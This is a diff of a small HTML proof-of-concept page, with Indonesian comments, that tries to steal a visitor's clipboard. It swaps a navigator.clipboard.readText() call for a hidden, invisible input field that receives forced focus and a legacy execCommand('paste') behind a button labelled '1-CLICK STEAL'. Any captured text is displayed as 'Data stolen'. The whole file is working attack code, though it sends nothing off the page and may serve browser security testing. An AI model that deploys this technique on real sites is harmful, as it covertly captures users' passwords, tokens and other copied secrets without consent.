@@ -1,31 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clipboard Read PoC</title>
-</head>
 <body style="font-family: monospace; background: #222; color: #fff; padding: 20px;">
     
-    <button id="stealBtn" style="padding: 10px 20px; background: red; color: white; font-weight: bold; border: none; cursor: pointer;">
-        READ CLIPBOARD DATA
+    <h3>Legacy Clipboard Read (execCommand)</h3>
+    <button id="stealBtn" style="padding: 10px; background: red; color: white; font-weight: bold; border: none; cursor: pointer;">
+        1-CLICK STEAL
     </button>
+    
+    <input type="text" id="trap" style="opacity: 0; position: absolute; z-index: -1;">
     
     <div id="log" style="margin-top: 20px; font-size: 14px; line-height: 1.6;"></div>
 
     <script>
         const btn = document.getElementById("stealBtn");
         const logDiv = document.getElementById("log");
+        const trap = document.getElementById("trap");
 
-        btn.addEventListener("click", async (e) => {
-            logDiv.innerHTML += `> Attempting to read clipboard... (isTrusted: ${e.isTrusted})<br>`;
+        btn.addEventListener("click", (e) => {
+            logDiv.innerHTML += `> Button clicked. isTrusted: ${e.isTrusted}<br>`;
+            
+            // 1. Paksa fokus ke input tersembunyi
+            trap.focus();
             
             try {
-                // Eksekusi pembacaan clipboard
-                const text = await navigator.clipboard.readText();
-                logDiv.innerHTML += `<span style="color: #0f0; font-weight: bold;">> SUCCESS: Data stolen -> "${text}"</span><br><br>`;
+                // 2. Eksekusi perintah paste jadul
+                const success = document.execCommand('paste');
+                
+                if (success) {
+                    const stolenText = trap.value;
+                    logDiv.innerHTML += `<span style="color: #0f0; font-weight: bold;">> SUCCESS: Data stolen -> "${stolenText}"</span><br>`;
+                } else {
+                    logDiv.innerHTML += `<span style="color: yellow;">> FAILED: execCommand returned false.</span><br>`;
+                }
             } catch (err) {
-                logDiv.innerHTML += `<span style="color: red;">> BLOCKED: ${err.name} - ${err.message}</span><br><br>`;
+                logDiv.innerHTML += `<span style="color: red;">> BLOCKED: ${err.message}</span><br>`;
             }
         });
     </script>
